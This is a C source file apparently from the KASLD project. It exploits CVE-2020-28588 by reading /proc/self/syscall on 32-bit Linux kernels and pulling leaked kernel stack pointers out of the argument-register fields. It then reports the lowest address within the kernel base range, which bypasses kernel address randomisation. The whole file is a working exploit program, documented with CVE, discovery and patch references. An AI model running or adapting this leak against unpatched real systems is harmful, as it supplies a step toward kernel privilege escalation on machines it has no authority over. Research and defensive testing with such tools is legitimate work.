// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve process syscall argument registers from /proc/<PID>/syscall
// which may leak uninitialized kernel stack memory from collect_syscall()
// on 32-bit systems (ARM/x86_32/...) (CVE-2020-28588).
// Discovered by Lilith >_> and Claudio Bozzato of Cisco Talos.
//
// Introduced in kernel v5.1-rc4 on 2019-04-04:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
//
// Patched in kernel v5.10-rc7~25 on 2020-12-03.
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
//
// Requires:
// - CONFIG_HAVE_ARCH_TRACEHOOK=y
//
// References:
// https://talosintelligence.com/vulnerability_reports/TALOS-2020-1211
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
// https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_kernel_addr_proc_pid_syscall() {
  FILE *f;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;
  unsigned int buff_len = 1024;
  char path[32];
  char buff[buff_len];
  char *ptr;
  char *endptr;

  snprintf(path, sizeof(path), "/proc/%d/syscall", (pid_t)getpid());

  printf("[.] checking %s argument registers ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    return 0;
  }

  /* Lazy implementation. In practice we only want data after the first 24 bytes
   * (from the fifth value onwards).
   *
   * $ cat /proc/self/syscall
   * 0 0x76f7300000000003 0x4000 0x0 0x8050389c8098fde4 0xee297df0ee297e2c [...]
   *                                   ^       ^
   */
  ptr = strtok(buff, " ");
  while ((ptr = strtok(NULL, " ")) != NULL) {
    if (strlen(ptr) < 10 || strlen(ptr) > 18)
      continue;

    unsigned long long reg_addr = strtoull(&ptr[0], &endptr, 16);

    if (!reg_addr)
      continue;

    if (strlen(ptr) == 10) {
      // register argument is a single pointer
      leaked_addr = reg_addr;
    } else if (strlen(ptr) > 10 && strlen(ptr) <= 18) {
      // register argument is two concatenated pointers (without leading zeros)
      // split it and grab the lowest of the two
      unsigned long a = reg_addr & 0xffffffff;
      unsigned long b = reg_addr >> 32;
      if (a < b) {
        leaked_addr = a;
      } else {
        leaked_addr = b;
      }
    } else {
      continue;
    }

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      // printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  fclose(f);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_proc_pid_syscall();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);

  return 0;
}
